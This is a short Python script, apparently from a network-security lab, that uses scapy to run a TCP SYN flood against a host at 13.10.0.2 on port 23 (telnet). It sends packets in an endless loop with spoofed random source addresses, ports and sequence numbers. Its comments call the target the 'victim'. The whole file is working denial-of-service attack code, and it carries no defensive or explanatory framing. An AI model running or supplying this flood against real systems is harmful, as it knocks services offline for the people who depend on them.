#!/bin/env python3

#importing packages
from scapy.all import *
from ipaddress import IPv4Address
from random import randint

#function to generate random 1-2 bytes
def randomdig(n):
    if n==1:	
    	range_start = 0
    	range_end = 65535
    	return randint(range_start, range_end)
    
    if n==2:	
    	range_start = 0
    	range_end = 2147483647
    	return randint(range_start, range_end)

#making new IP packet with target IP as destination address    
ip  = IP(dst="13.10.0.2")

#making a TCP SYN packet with destination(victim) port set to 23
#flag S indicates SYN packet
tcp = TCP(dport=23, flags='S')

#stacking layers in the packet
packets = ip/tcp

#run infinite loop to send packets
while True:
    packets[IP].src    = str(IPv4Address(randomdig(2)))
    packets[TCP].sport = randomdig(1)
    packets[TCP].seq   = randomdig(2)
    send(packets, iface = 'br-0ce8beee87eb', verbose = 0)
